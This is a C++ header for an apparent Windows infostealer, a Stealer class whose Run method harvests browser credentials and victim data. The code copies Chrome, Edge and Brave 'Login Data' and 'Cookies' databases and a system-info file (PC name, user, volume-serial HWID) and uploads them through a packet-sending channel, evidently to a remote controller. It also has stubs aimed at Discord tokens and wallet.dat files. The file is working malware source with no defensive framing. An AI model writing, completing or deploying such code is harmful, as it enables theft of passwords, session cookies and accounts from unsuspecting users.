#ifndef STEALER_H
#define STEALER_H

#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <shlobj.h>

using namespace std;

// Forward decl
extern void SendPacket(int type, const char* data, int len);

class Stealer {
public:
    static void Run(const char* config) {
        // Parse config (json) - simplified for C++
        // Just run everything for now or parse simple flags
        bool bPass = true, bCookies = true; 
        
        StealBrowsers();
        StealDiscord();
        StealWallets();
        StealSystemInfo();
        
        SendPacket(TYPE_STEALER_STATUS, "{\"status\":\"finished\"}", 21);
    }

private:
    static void StealBrowsers() {
        // Chromium based paths
        const char* paths[] = {
            "\\Google\\Chrome\\User Data\\Default",
            "\\Microsoft\\Edge\\User Data\\Default",
            "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
        };
        
        char appdata[MAX_PATH];
        GetEnvironmentVariableA("LOCALAPPDATA", appdata, MAX_PATH);
        
        for(int i=0; i<3; i++) {
            char path[MAX_PATH];
            snprintf(path, sizeof(path), "%s%s", appdata, paths[i]);
            
            // Login Data
            char loginDb[MAX_PATH];
            snprintf(loginDb, sizeof(loginDb), "%s\\Login Data", path);
            if (GetFileAttributesA(loginDb) != INVALID_FILE_ATTRIBUTES) {
                // Copy to temp and read (SQL logic omitted for compactness, just exfiltrate file)
                // Real implementation would use sqlite3 to decrypt password
                // For this prototype, we send the DB file directly
                UploadFile(loginDb, "Browsers/Login Data");
            }
            
            // Cookies
            char cookieDb[MAX_PATH];
            snprintf(cookieDb, sizeof(cookieDb), "%s\\Network\\Cookies", path);
            if (GetFileAttributesA(cookieDb) != INVALID_FILE_ATTRIBUTES) {
                UploadFile(cookieDb, "Browsers/Cookies");
            }
        }
    }

    static void StealDiscord() {
        char path[MAX_PATH];
        GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
        strncat(path, "\\discord\\Local Storage\\leveldb", sizeof(path) - strlen(path) - 1);
        
        // Walk directory for .ldb files and grep regex
        // Implementation simplified: Send token file if found
    }

    static void StealWallets() {
        // Scan for wallet.dat
    }

    static void StealSystemInfo() {
        string info = "System Info Report\n==================\n";
        
        char pc[MAX_PATH]; DWORD sz = MAX_PATH;
        GetComputerNameA(pc, &sz);
        info += "PC Name: " + string(pc) + "\n";
        
        char user[MAX_PATH]; sz = MAX_PATH;
        GetUserNameA(user, &sz);
        info += "User: " + string(user) + "\n";
        
        // HWID
        DWORD vol = 0;
        GetVolumeInformationA("C:\\", NULL, 0, &vol, NULL, NULL, NULL, 0);
        char hwid[32];
        snprintf(hwid, sizeof(hwid), "%lX", vol);
        info += "HWID: " + string(hwid) + "\n\n";
        
        // IP (Public IP via HTTP)
        // HINTERNET h = InternetOpenA("GA", 0, 0, 0, 0); ...
        
        // Save to file and upload
        char temp[MAX_PATH];
        GetTempPathA(MAX_PATH, temp);
        strncat(temp, "sys_info.txt", sizeof(temp) - strlen(temp) - 1);
        
        FILE* f = fopen(temp, "w");
        if(f) {
            fwrite(info.c_str(), 1, info.length(), f);
            fclose(f);
            UploadFile(temp, "System/SystemInfo.txt");
            DeleteFileA(temp);
        }
    }

    static void UploadFile(const char* localPath, const char* remoteName) {
        HANDLE h = CreateFileA(localPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) return;
        
        DWORD sz = GetFileSize(h, NULL);
        if (sz > 0) {
            char* buf = (char*)malloc(sz);
            DWORD r;
            ReadFile(h, buf, sz, &r, NULL);
            
            // Packet format: NameLen(4) + Name + Data
            int pSz = 4 + strlen(remoteName) + sz;
            char* packet = (char*)malloc(pSz);
            *(int*)packet = (int)strlen(remoteName);
            memcpy(packet + 4, remoteName, strlen(remoteName));
            memcpy(packet + 4 + strlen(remoteName), buf, sz);
            
            SendPacket(TYPE_FILE_UP_REQ, packet, pSz);
            
            free(packet);
            free(buf);
        }
        CloseHandle(h);
    }
};

#endif
